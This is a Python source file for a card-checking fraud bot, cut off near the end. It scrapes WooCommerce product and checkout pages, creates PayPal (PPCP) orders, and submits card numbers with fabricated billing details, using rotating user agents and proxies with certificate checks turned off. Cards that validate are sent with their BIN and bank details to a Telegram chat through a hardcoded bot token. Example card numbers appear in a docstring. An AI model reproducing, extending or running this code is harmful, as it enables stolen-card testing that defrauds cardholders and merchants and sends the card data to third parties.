#!/usr/bin/env python3
import requests
import json
import re
import random
import time
import threading
import tempfile
import os
from urllib.parse import urlparse, parse_qs, urlencode
from datetime import datetime
from html.parser import HTMLParser
from typing import Dict, List, Tuple, Optional

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global lock for file operations
file_lock = threading.Lock()


def normalize_card_format(card_input):
    """
    Normalize card format to number|mm|yy|cvv
    Supports:
    - 5401683112957490|10|2029|741 (pipe-separated)
    - 4284303806640816 0628 116 (space-separated with mmyy)
    """
    card_input = card_input.strip()

    # Check if already in pipe format
    if '|' in card_input:
        parts = card_input.split('|')
        if len(parts) == 4:
            number, mm, yy, cvv = parts
            # Normalize year to 4 digits
            if len(yy) == 2:
                yy = '20' + yy
            return f"{number}|{mm}|{yy}|{cvv}"
        return None

    # Handle space-separated format: number mmyy cvv
    parts = card_input.split()
    if len(parts) == 3:
        number, mmyy, cvv = parts
        if len(mmyy) == 4:
            mm = mmyy[:2]
            yy = '20' + mmyy[2:]
            return f"{number}|{mm}|{yy}|{cvv}"

    return None


def check_single_card(card_details):
    """
    Check a single card using PPCP gateway.

    Args:
        card_details (str): Card in format 'number|mm|yy|cvv'

    Returns:
        str: Formatted response result
    """
    # Load sites from sites.txt file
    sites = []
    if os.path.exists('ppcp/sites.txt'):
        with open('ppcp/sites.txt', 'r') as f:
            sites = [line.strip() for line in f if line.strip()]
    else:
        # Load from the project root if ppcp folder is not present in the path
        if os.path.exists('sites.txt'):
            with open('sites.txt', 'r') as f:
                sites = [line.strip() for line in f if line.strip()]

    if not sites:
        return "❌ No sites found!"

    # Use the existing check_ppcp_card function
    return check_ppcp_card(card_details, sites)


class Config:
    """Configuration settings"""
    TELEGRAM_TOKEN = "7723561160:AAHZp0guO69EmC_BumauDsDeseTvh7GY3qA"
    CHAT_ID = "-1003171561914"
    NUM_BOTS = 1  # Will be set by user input
    TIMEOUT = 20


class AddressData:
    """Address data for different countries"""
    ADDRESSES = {
        'NZ': [
            {'street': '248 Princes Street', 'city': 'Grafton', 'zip': '1010', 'state': 'Auckland', 'phone': '(028) 8784-059'},
            {'street': '75 Queen Street', 'city': 'Auckland', 'zip': '1010', 'state': 'Auckland', 'phone': '(029) 1234-567'},
        ],
        'AU': [
            {'street': '123 George Street', 'city': 'Sydney', 'zip': '2000', 'state': 'NSW', 'phone': '+61 2 1234 5678'},
            {'street': '456 Collins Street', 'city': 'Melbourne', 'zip': '3000', 'state': 'VIC', 'phone': '+61 3 8765 4321'},
        ],
        'JP': [
            {'street': '1 Chome-1-2 Oshiage', 'city': 'Sumida City, Tokyo', 'zip': '131-0045', 'state': 'Tokyo', 'phone': '+81 3-1234-5678'},
        ],
        'PH': [
            {'street': '1234 Makati Ave', 'city': 'Makati', 'zip': '1200', 'state': 'Metro Manila', 'phone': '+63 2 1234 5678'},
        ],
        'MY': [
            {'street': 'No 56, Jalan Bukit Bintang', 'city': 'Kuala Lumpur', 'zip': '55100', 'state': 'Wilayah Persekutuan', 'phone': '+60 3-1234 5678'},
        ],
        'GB': [
            {'street': '10 Downing Street', 'city': 'London', 'zip': 'SW1A 2AA', 'state': '', 'phone': '+44 20 7925 0918'},
        ],
        'CA': [
            {'street': '123 Main Street', 'city': 'Toronto', 'zip': 'M5H 2N2', 'state': 'Ontario', 'phone': '(416) 555-0123'},
        ],
        'SG': [
            {'street': '10 Anson Road', 'city': 'Singapore', 'zip': '079903', 'state': 'Central Region', 'phone': '(+65) 6221-1234'},
        ],
        'TH': [
            {'street': '123 Sukhumvit Road', 'city': 'Bangkok', 'zip': '10110', 'state': 'Bangkok', 'phone': '(+66) 2-123-4567'},
        ],
        'HK': [
            {'street': '1 Queen\'s Road Central', 'city': 'Central', 'zip': '', 'state': 'Hong Kong Island', 'phone': '(+852) 2523-1234'},
        ],
        'ZA': [
            {'street': '10 Adderley Street', 'city': 'Cape Town', 'zip': '8000', 'state': 'Western Cape', 'phone': '(+27) 21-123-4567'},
        ],
        'NL': [
            {'street': '1 Dam Square', 'city': 'Amsterdam', 'zip': '1012 JS', 'state': 'North Holland', 'phone': '(+31) 20-555-1234'},
        ],
        'US': [
            {'street': '1600 Pennsylvania Avenue NW', 'city': 'Washington', 'zip': '20500', 'state': 'DC', 'phone': '+1 202-456-1111'},
            {'street': '1 Infinite Loop', 'city': 'Cupertino', 'zip': '95014', 'state': 'CA', 'phone': '+1 408-996-1010'},
        ],
    }


class NameGenerator:
    """Generate random names and emails"""
    FIRST_NAMES = ['John', 'Kyla', 'Sarah', 'Michael', 'Emma', 'James', 'Olivia', 'William', 'Ava', 'Benjamin']
    LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Jones', 'Brown', 'Davis', 'Miller', 'Wilson', 'Moore', 'Taylor']
    EMAIL_DOMAINS = ['gmail.com', 'yahoo.com', 'outlook.com', 'icloud.com', 'hotmail.com']
    
    @staticmethod
    def generate() -> Tuple[str, str, str]:
        """Generate random first name, last name, and email"""
        fname = random.choice(NameGenerator.FIRST_NAMES)
        lname = random.choice(NameGenerator.LAST_NAMES)
        domain = random.choice(NameGenerator.EMAIL_DOMAINS)
        email = f"{fname.lower()}.{lname.lower()}@{domain}"
        return fname, lname, email


class UserAgentGenerator:
    """Generate random user agents"""
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    ]
    
    @staticmethod
    def get() -> str:
        return random.choice(UserAgentGenerator.USER_AGENTS)


class TelegramNotifier:
    """Send notifications to Telegram"""
    
    @staticmethod
    def send_message(message: str, token: str, chat_id: str):
        """Send message to Telegram"""
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            data = {
                'chat_id': chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            requests.post(url, data=data, timeout=10)
        except Exception as e:
            print(f"Telegram error: {e}")


class BinChecker:
    """Check BIN information"""
    
    @staticmethod
    def check(bin_number: str, ua: str) -> Dict[str, str]:
        """Get BIN information"""
        try:
            url = f'https://bincheck.io/details/{bin_number}'
            headers = {
                'user-agent': ua,
                'referer': 'https://bincheck.io/',
                'accept-language': 'en-US,en;q=0.9'
            }
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            html = response.text
            
            # Parse BIN info
            card_brand = BinChecker._extract_field(html, 'Card\\s*Brand')
            card_type = BinChecker._extract_field(html, 'Card\\s*Type')
            card_level = BinChecker._extract_field(html, 'Card\\s*Level')
            
            # Extract issuer
            issuer_match = re.search(r'<td[^>]*>\s*Issuer\s*Name\s*/\s*Bank\s*</td>\s*<td[^>]*>.*?<a[^>]*title="([^"]+)"', html, re.I)
            issuer_name = issuer_match.group(1).strip() if issuer_match else 'Unknown'
            issuer_name = re.sub(r'^Complete\s*', '', issuer_name, flags=re.I)
            issuer_name = re.sub(r'\s*database.*$', '', issuer_name, flags=re.I)
            issuer_name = re.sub(r'\s*-\s*[A-Z\s]+$', '', issuer_name, flags=re.I)
            
            # Extract country
            country_match = re.search(r'<td[^>]*>\s*ISO\s*Country\s*Name\s*</td>\s*<td[^>]*>.*?<a[^>]*title="([^"]+)"', html, re.I)
            iso_country = country_match.group(1).strip() if country_match else 'Unknown'
            iso_country = re.sub(r'^Complete\s*', '', iso_country, flags=re.I)
            iso_country = re.sub(r'\s*database.*$', '', iso_country, flags=re.I)
            
            return {
                'brand': card_brand,
                'type': card_type,
                'level': card_level,
                'issuer': issuer_name,
                'country': iso_country
            }
        except Exception as e:
            return {
                'brand': 'Unknown',
                'type': 'Unknown',
                'level': 'Unknown',
                'issuer': 'Unknown',
                'country': 'Unknown'
            }
    
    @staticmethod
    def _extract_field(html: str, field_name: str) -> str:
        """Extract field from HTML"""
        pattern = f'<td[^>]*>\\s*{field_name}\\s*</td>\\s*<td[^>]*>\\s*(.*?)\\s*</td>'
        match = re.search(pattern, html, re.I)
        return match.group(1).strip() if match else 'Unknown'


class CardChecker:
    """Main card checker class"""
    
    def __init__(self, cc_data: str, site_url: str, proxy: Optional[str] = None):
        self.cc_data = cc_data
        self.site_url = site_url
        self.proxy = proxy
        self.session = requests.Session()
        self.ua = UserAgentGenerator.get()
        self.start_time = time.time()  # Track start time for response
        self.cookie_file = tempfile.NamedTemporaryFile(delete=False)

        # Parse card data
        parts = cc_data.split('|')
        self.cc = parts[0].strip()
        self.mes = parts[1].strip().zfill(2)
        self.ano = parts[2].strip()
        self.cvv = parts[3].strip()

        # Fix year format
        if len(self.ano) == 2:
            self.ano = f"20{self.ano}"

        self.cc6 = self.cc[:6]

        # Setup proxy
        self.proxies = {}
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) >= 2:
                if len(proxy_parts) == 4:
                    proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
                else:
                    proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
                self.proxies = {'http': proxy_url, 'https': proxy_url}

        # Parse site
        parsed = urlparse(site_url)
        self.hostname = parsed.netloc
        self.country = self._detect_country()
        
        # Get address
        address = self._get_address()
        self.street = address['street']
        self.city = address['city']
        self.zip = address['zip']
        self.state = address['state']
        self.phone = address['phone']
        
        # Generate name
        self.fname, self.lname, self.email = NameGenerator.generate()
    
    def _detect_country(self) -> str:
        """Detect country from domain"""
        hostname_lower = self.hostname.lower()
        if hostname_lower.endswith('.co.uk'):
            return 'GB'
        elif hostname_lower.endswith('.au'):
            return 'AU'
        elif hostname_lower.endswith('.ca'):
            return 'CA'
        elif hostname_lower.endswith('.co.nz'):
            return 'NZ'
        elif hostname_lower.endswith('.jp'):
            return 'JP'
        elif hostname_lower.endswith('.ph'):
            return 'PH'
        elif hostname_lower.endswith('.my'):
            return 'MY'
        elif hostname_lower.endswith('.sg'):
            return 'SG'
        elif hostname_lower.endswith('.th'):
            return 'TH'
        elif hostname_lower.endswith('.nl'):
            return 'NL'
        elif hostname_lower.endswith('.hk'):
            return 'HK'
        elif hostname_lower.endswith('.co.za'):
            return 'ZA'
        else:
            return 'US'
    
    def _get_address(self) -> Dict[str, str]:
        """Get address for country"""
        addresses = AddressData.ADDRESSES.get(self.country, AddressData.ADDRESSES['US'])
        index = int(time.time() / 10) % len(addresses)
        return addresses[index]
    
    def _get_headers(self, extra: Optional[Dict] = None) -> Dict[str, str]:
        """Get request headers"""
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': self.ua,
            'referer': f'https://{self.hostname}/',
        }
        if extra:
            headers.update(extra)
        return headers
    
    def check(self) -> Dict[str, any]:
        """Check the card"""
        try:
            # Step 1: Get product page
            product_page = self._get_product_page()
            if not product_page:
                return self._error_result("Failed to load product page")
            
            # Step 2: Parse product ID
            product_id, variation_id = self._parse_product_id(product_page)
            if not product_id:
                return self._error_result("Cannot find product ID")
            
            # Step 3: Add to cart
            atc_url = self._build_atc_url(product_id, variation_id)
            atc_response = self._add_to_cart(atc_url)
            
            # Step 4: Get checkout page
            checkout_html = self._get_checkout()
            if not checkout_html:
                return self._error_result("Failed to load checkout")
            
            # Step 5: Parse nonces and price
            nonces = self._parse_nonces(checkout_html)
            price = self._parse_price(checkout_html)
            
            # Step 6: Get client ID
            access_token = self._get_client_id(nonces.get('client_nonce'))
            if not access_token:
                return self._error_result("Failed to get access token")
            
            # Step 7: Create order
            order_id, custom_id = self._create_order(nonces.get('create_order_nonce'))
            if not order_id:
                return self._error_result("Failed to create order")
            
            # Step 8: Confirm payment
            confirm_result = self._confirm_payment(order_id, access_token)
            
            # Step 9: Approve order
            approve_result = self._approve_order(order_id, nonces.get('approve_order_nonce'))
            
            # Step 10: Process checkout
            payment_result = self._process_checkout(custom_id, nonces.get('checkout_nonce'))
            
            # Step 11: Parse result
            return self._parse_result(payment_result, price)
            
        except Exception as e:
            return self._error_result(f"Exception: {str(e)}")
    
    def _get_product_page(self) -> Optional[str]:
        """Get product page HTML"""
        try:
            response = self.session.get(
                self.site_url,
                headers=self._get_headers(),
                proxies=self.proxies,
                timeout=Config.TIMEOUT,
                verify=False
            )
            return response.text
        except:
            return None
    
    def _parse_product_id(self, html: str) -> Tuple[Optional[str], Optional[str]]:
        """Parse product ID and variation ID from HTML"""
        # Try variations form
        form_match = re.search(r'<form[^>]+class="variations_form cart"[^>]+data-product_id="([^"]+)"', html)
        if form_match:
            product_id = form_match.group(1)
            # Try to get variation data
            var_match = re.search(r'data-product_variations="([^"]+)"', html)
            if var_match and var_match.group(1) != 'false':
                try:
                    var_data = json.loads(var_match.group(1).replace('&quot;', '"'))
                    if var_data and len(var_data) > 0:
                        return product_id, var_data[0].get('variation_id')
                except:
                    pass
            return product_id, None
        
        # Try input field
        input_match = re.search(r'<input[^>]+name="(?:product_id|add-to-cart)"[^>]+value="([^"]+)"', html)
        if input_match:
            return input_match.group(1), None
        
        # Try button
        button_match = re.search(r'<button[^>]+name="add-to-cart"[^>]+value="([^"]+)"', html)
        if button_match:
            return button_match.group(1), None
        
        return None, None
    
    def _build_atc_url(self, product_id: str, variation_id: Optional[str]) -> str:
        """Build add to cart URL"""
        params = {
            'quantity': '1',
            'add-to-cart': product_id
        }
        if variation_id:
            params['variation_id'] = variation_id
            params['product_id'] = product_id
        
        return f"{self.site_url}?{urlencode(params)}"
    
    def _add_to_cart(self, url: str) -> Optional[str]:
        """Add product to cart"""
        try:
            response = self.session.get(
                url,
                headers=self._get_headers(),
                proxies=self.proxies,
                timeout=Config.TIMEOUT,
                verify=False
            )
            return response.text
        except:
            return None
    
    def _get_checkout(self) -> Optional[str]:
        """Get checkout page"""
        try:
            checkout_url = f"https://{self.hostname}/checkout"
            response = self.session.get(
                checkout_url,
                headers=self._get_headers(),
                proxies=self.proxies,
                timeout=Config.TIMEOUT,
                verify=False
            )
            return response.text
        except:
            return None
    
    def _parse_nonces(self, html: str) -> Dict[str, str]:
        """Parse nonces from checkout page"""
        nonces = {}
        
        # Create order nonce
        match = re.search(r'"create_order":\{"endpoint":".*?","nonce":"([^"]+)"', html)
        if match:
            nonces['create_order_nonce'] = match.group(1)
        
        # Approve order nonce
        match = re.search(r'"approve_order":\{"endpoint":".*?","nonce":"([^"]+)"', html)
        if match:
            nonces['approve_order_nonce'] = match.group(1)
        
        # Client nonce
        match = re.search(r'"data_client_id":\s*\{\s*"set_attribute":.*?\s*"endpoint":.*?\s*"nonce":\s*"([^"]+)"', html)
        if match:
            nonces['client_nonce'] = match.group(1)
        
        # Checkout nonce
        match = re.search(r'<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="([^"]+)"', html)
        if match:
            nonces['checkout_nonce'] = match.group(1)
        
        return nonces
    
    def _parse_price(self, html: str) -> str:
        """Parse price from checkout page"""
        pattern = r'<tr class="order-total">.*?<th>Total</th>\s*<td>\s*<strong>\s*<span class="woocommerce-Price-amount amount">\s*<bdi>\s*<span class="woocommerce-Price-currencySymbol">(.+?)</span>\s*([\d.]+)'
        match = re.search(pattern, html, re.DOTALL)
        if match:
            symbol = match.group(1).replace('&pound;', '£')
            amount = match.group(2)
            return f"{symbol}{amount}"
        return "N/A"
    
    def _get_client_id(self, nonce: Optional[str]) -> Optional[str]:
        """Get PayPal client ID and access token"""
        try:
            url = f"https://{self.hostname}/?wc-ajax=ppc-data-client-id"
            headers = self._get_headers({
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-requested-with': 'XMLHttpRequest',
            })
            
            data = {
                'set_attribute': 'true',
                'nonce': nonce or '',
                'user': '0',
                'has_subscriptions': 'false',
                'paypal_subscriptions_enabled': 'false'
            }
            
            response = self.session.post(
                url,
                headers=headers,
                data=json.dumps(data),
                proxies=self.proxies,
                timeout=Config.TIMEOUT,
                verify=False
            )
            
            result = response.json()
            token = result.get('token')
            if token:
                import base64
                decoded = base64.b64decode(token).decode('utf-8')
                token_data = json.loads(decoded)
                return token_data.get('paypal', {}).get('accessToken')
        except:
            pass
        return None
    
    def _create_order(self, nonce: Optional[str]) -> Tuple[Optional[str], Optional[str]]:
        """Create PayPal order"""
        try:
            url = f"https://{self.hostname}/?wc-ajax=ppc-create-order"
            headers = self._get_headers({
                'content-type': 'application/json',
            })
            
            form_data = {
                'billing_first_name': self.fname,
                'billing_last_name': self.lname,
                'billing_company': '',
                'billing_country': self.country,
                'billing_address_1': self.street,
                'billing_address_2': '',
                'billing_city': self.city,
                'billing_state': self.state,
                'billing_postcode': self.zip,
                'billing_phone': self.phone,
                'billing_email': self.email,
                'payment_method': 'ppcp-gateway',
                'terms': 'on',
                'woocommerce-process-checkout-nonce': nonce or '',
            }
            
            payload = {
                'nonce': nonce or '',
                'payer': None,
                'bn_code': 'Woo_PPCP',
                'context': 'checkout',
                'order_id': '0',
                'payment_method': 'ppcp-gateway',
                'form_encoded': urlencode(form_data),
                'createaccount': False,
                'save_payment_method': False
            }
            
            response = self.session.post(
                url,
                headers=headers,
                data=json.dumps(payload),
                proxies=self.proxies,
                timeout=Config.TIMEOUT,
                verify=False
            )
            
            result = response.json()
            if result.get('success'):
                return result['data']['id'], result['data'].get('custom_id')
        except:
            pass
        return None, None
    
    def _confirm_payment(self, order_id: str, access_token: str) -> Optional[str]:
        """Confirm payment with PayPal"""
        try:
            url = f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source"
            headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'authorization': f'Bearer {access_token}',
                'user-agent': self.ua,
            }
            
            payload = {
                'payment_source': {
                    'card': {
                        'number': self.cc,
                        'security_code': self.cvv,
                        'expiry': f'{self.ano}-{self.mes}'
                    }
                }
            }
            
            response = self.session.post(
                url,
                headers=headers,
                data=json.dumps(payload),
                proxies=self.proxies,
                timeout=Config.TIMEOUT,
                verify=False
            )
            return response.text
        except:
            return None
    
    def _approve_order(self, order_id: str, nonce: Optional[str]) -> Optional[str]:
        """Approve PayPal order"""
        try:
            url = f"https://{self.hostname}/?wc-ajax=ppc-approve-order"
            headers = self._get_headers({
                'content-type': 'application/json',
            })
            
            payload = {
                'nonce': nonce or '',
                'order_id': order_id
            }
            
            response = self.session.post(
                url,
                headers=headers,
                data=json.dumps(payload),
                proxies=self.proxies,
                timeout=Config.TIMEOUT,
                verify=False
            )
            return response.text
        except:
            return None
    
    def _process_checkout(self, custom_id: Optional[str], nonce: Optional[str]) -> Optional[str]:
        """Process final checkout"""
        try:
            url = f"https://{self.hostname}/?wc-ajax=checkout"
            headers = self._get_headers({
                'content-type': 'application/x-www-form-urlencoded',
                'x-requested-with': 'XMLHttpRequest',
            })
            
            data = {
                'billing_first_name': self.fname,
                'billing_last_name': self.lname,
                'billing_company': '',
                'billing_country': self.country,
                'billing_address_1': self.street,
                'billing_address_2': '',
                'billing_city': self.city,
                'billing_state': self.state,
                'billing_postcode': self.zip,
                'billing_phone': self.phone,
                'billing_email': self.email,
                'payment_method': 'ppcp-gateway',
                'terms': 'on',
                'woocommerce-process-checkout-nonce': nonce or '',
                'ppcp-resume-order': custom_id or ''
            }
            
            response = self.session.post(
                url,
                headers=headers,
                data=urlencode(data),
                proxies=self.proxies,
                timeout=Config.TIMEOUT,
                verify=False
            )
            return response.text
        except:
            return None
    
    def _parse_result(self, payment_result: Optional[str], price: str) -> Dict[str, any]:
        """Parse payment result"""
        if not payment_result:
            return self._error_result("No payment response")

        # Get BIN info
        bin_info = BinChecker.check(self.cc6, self.ua)

        # Record start time for elapsed calculation
        start_time = getattr(self, 'start_time', time.time())

        result = {
            'cc': self.cc_data,
            'site': self.hostname,
            'price': price,
            'bin_info': bin_info,
            'status': 'DEAD',
            'message': 'Unknown error'
        }

        # Check for success
        if '"result":"success"' in payment_result and 'order-received' in payment_result:
            try:
                data = json.loads(payment_result)
                receipt_url = data.get('redirect', '')
                result['status'] = 'CVV'
                result['message'] = 'CVV CHARGED'
                result['receipt'] = receipt_url

                # Calculate elapsed time
                elapsed_time = time.time() - start_time

                # Format the response as requested
                response_text = f"""CVV ✅

𝗖𝗖 ⇾ {self.cc_data}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CVV CHARGED

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""

                result['response_text'] = response_text
                result['formatted_status'] = 'CVV'

                # Send to Telegram
                telegram_msg = f"""<b>PPCP-GATEWAY CHARGED</b>

● <b>CC:</b> {self.cc_data}
● <b>Price:</b> {price}
● <b>Bin:</b> {self.cc6}
● <b>Card Brand:</b> {bin_info['brand']}
● <b>Card Type:</b> {bin_info['type']} - {bin_info['level']}
● <b>Issuing Bank:</b> {bin_info['issuer']}
● <b>Country:</b> {bin_info['country']}
● <b>Receipt:</b> {receipt_url}"""

                TelegramNotifier.send_message(telegram_msg, Config.TELEGRAM_TOKEN, Config.CHAT_ID)
                return result
            except:
                pass

        # Check for specific errors
        if 'PAYMENT_DENIED' in payment_result:
            result['status'] = 'CCN'
            result['message'] = 'PAYMENT_DENIED - LIVE CC'
            result['formatted_status'] = 'CCN'

            # Calculate elapsed time
            elapsed_time = time.time() - start_time

            response_text = f"""CCN ✅

𝗖𝗖 ⇾ {self.cc_data}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ PAYMENT_DENIED - LIVE CC

𝗕𝗜𝗻 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""

            result['response_text'] = response_text

            # Send to Telegram
            telegram_msg = f"""<b>PPCP-GATEWAY LIVE</b>

● <b>CC:</b> {self.cc_data}
● <b>Price:</b> {price}
● <b>Bin:</b> {self.cc6}
● <b>Card Brand:</b> {bin_info['brand']}
● <b>Card Type:</b> {bin_info['type']} - {bin_info['level']}
● <b>Issuing Bank:</b> {bin_info['issuer']}
● <b>Country:</b> {bin_info['country']}"""

            TelegramNotifier.send_message(telegram_msg, Config.TELEGRAM_TOKEN, Config.CHAT_ID)
        elif 'ORDER_NOT_APPROVED' in payment_result:
            result['message'] = 'ORDER_NOT_APPROVED'

            # Calculate elapsed time
            elapsed_time = time.time() - start_time

            response_text = f"""DECLINED ❌

𝗖𝗖 ⇾ {self.cc_data}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ ORDER_NOT_APPROVED

𝗕𝗶𝗻 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""

            result['response_text'] = response_text
        elif 'TRANSACTION_REFUSED' in payment_result:
            result['message'] = 'TRANSACTION_REFUSED'

            # Calculate elapsed time
            elapsed_time = time.time() - start_time

            response_text = f"""DECLINED ❌

𝗖𝗖 ⇾ {self.cc_data}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ TRANSACTION_REFUSED

𝗕𝗶𝗻 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""

            result['response_text'] = response_text
        elif 'DUPLICATE_INVOICE_ID' in payment_result:
            result['message'] = 'DUPLICATE_INVOICE_ID'

            # Calculate elapsed time
            elapsed_time = time.time() - start_time

            response_text = f"""DECLINED ❌

𝗖𝗖 ⇾ {self.cc_data}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ DUPLICATE_INVOICE_ID

𝗕𝗶𝗻 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""

            result['response_text'] = response_text
        elif 'session has expired' in payment_result:
            result['message'] = 'Session expired'

            # Calculate elapsed time
            elapsed_time = time.time() - start_time

            response_text = f"""DECLINED ❌

𝗖𝗖 ⇾ {self.cc_data}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Session expired

𝗕𝗶𝗻 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""

            result['response_text'] = response_text
        elif 'Payment provider declined' in payment_result:
            result['message'] = 'Payment provider declined'

            # Calculate elapsed time
            elapsed_time = time.time() - start_time

            response_text = f"""DECLINED ❌

𝗖𝗖 ⇾ {self.cc_data}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment provider declined

𝗕𝗶𝗻 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""

            result['response_text'] = response_text
        else:
            # Try to extract message
            try:
                data = json.loads(payment_result)
                if 'messages' in data:
                    msg = re.sub(r'<[^>]+>', '', data['messages'])
                    msg = re.sub(r'\s+', ' ', msg).strip()
                    result['message'] = msg[:100]
            except:
                pass

            # Calculate elapsed time
            elapsed_time = time.time() - start_time

            response_text = f"""DECLINED ❌

𝗖𝗖 ⇾ {self.cc_data}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {result['message']}

𝗕𝗶𝗻 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
